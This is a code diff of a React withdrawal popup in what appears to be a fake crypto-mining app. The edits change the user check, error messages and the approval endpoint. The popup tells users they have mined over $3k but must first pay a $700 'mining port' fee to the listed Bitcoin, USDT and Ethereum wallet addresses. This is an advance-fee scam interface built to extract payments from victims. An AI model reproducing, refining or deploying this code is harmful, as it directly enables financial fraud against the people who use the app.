@@ -7,7 +7,7 @@ import { useHistory } from "react-router-dom";
 const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
   const [withdrawAmount, setWithdrawAmount] = useState("");
   const [storedWithdrawAmount, setStoredWithdrawAmount] = useState(0);
-  const [success, setSuccess] = useState(true);
+  const [success, setSuccess] = useState(false);
   const history = useHistory();
 
 
@@ -44,34 +44,33 @@ const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
   // );
 
   const handleWithdraw = async () => {
+    const userId = localStorage.getItem("userId");
+    
+    if (!userId) {
+      toast.error("Please login before you can perform withdraw");
+      return;
+    }
 
     if (!withdrawAmount || Number.isNaN(withdrawAmount) || parseFloat(withdrawAmount) <= 0) {
-      alert("Please enter a valid withdrawal amount.");
+      toast.error("Please enter a valid withdrawal amount.");
       return;
     }
 
     if (parseFloat(withdrawAmount) > storedWithdrawAmount) {
-      alert("Unable to withdraw this amount. Insufficient funds.");
+      toast.error("Unable to withdraw this amount. Insufficient funds.");
       return;
     }
     if (parseFloat(storedWithdrawAmount) < 3000) {
-      alert("Your balance must be up to 3000.");
+      toast.error("Your balance must be up to 3000.");
       return;
     }
 
-
-    const userEmail = localStorage.getItem("userEmail");
-    if (!userEmail) {
-      alert("Please login before you can perform withdraw");
-      return;
-    }
-
-    const SERVER_BASE_URL = "https://exam-nodejs-main.onrender.com";
-    const CHECK_WITHDRAWAL_APPROVAL_API_ENDPOINT = `${SERVER_BASE_URL}/api/withdrawal/approval/`;
+    const SERVER_BASE_URL = "";
+    const CHECK_WITHDRAWAL_APPROVAL_API_ENDPOINT = "https://exam-nodejs-main.onrender.com/api/withdrawal/approval/";
 
     try {
 
-      const res = await fetch(`${CHECK_WITHDRAWAL_APPROVAL_API_ENDPOINT}${userEmail}`, { method: 'POST' });
+      const res = await fetch(`${CHECK_WITHDRAWAL_APPROVAL_API_ENDPOINT}${userId}`, { method: 'POST' });
       const isApproved = (await res.json())?.withdrawal_status;
 
       if (isApproved) {
@@ -98,7 +97,7 @@ const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
       // console.log("[USER - NOT - APPROVED]");
 
     } catch (error) {
-      toast.error("\n🚫 Network Error \n🚫Please Try Again.");
+      toast.error("\n Network Error \n Please Try Again.");
       // setTimeout(() => window.location.reload(), 3000);
     }
 
@@ -109,14 +108,14 @@ const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
       <div className="withdraw-popup-content">
         {success ? (
           <p className="success-message">
-            <span style={{ color: "yelloe" }}> btcAddress = 123JgU9Zih5GBWN7mWKML2jSNCUwx8yb8j</span>
+            <span style={{ color: "yellow" }}> btcAddress = 123JgU9Zih5GBWN7mWKML2jSNCUwx8yb8j</span>
             <span style={{ color: "green" }}> usdtTrc20Address = TTGUJhv8jZKiUApoet6S9xXStUbZCCTywy</span>
             <span style={{ color: "orange" }}> ethereumAddress = 0x87cdd933bf000f96309215752696ae080f684ba9 </span>
             <span style={{ color: "red" }}>
               (You have an outstanding balance of $700 which was used to mine your crypto )
               <br />
               The crypto mining ⛏️ port you been mining ⛏️ from is not free
-              The total 💳 fee you owing is $700
+              The total 💳 fee you owing is $700 <br/>
               Based on how long you have been mining
               You have successfully mined above $3k, so you are eligible to withdraw your mined coins
               When you pay the $700 your mining ⛏️ port web open and you can withdraw your funds
@@ -128,10 +127,6 @@ const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
               Contact hack world support where you bought the software from
               You are free to keep mining for nothing stop 🛑 you!
               <br />
-
-              {/* <span style={{ color: "green" }}>(How to pay): </span>
-              Send payment to the provided wallet address provided to you on the page.
-              <br /> */}
 
             </span>
 
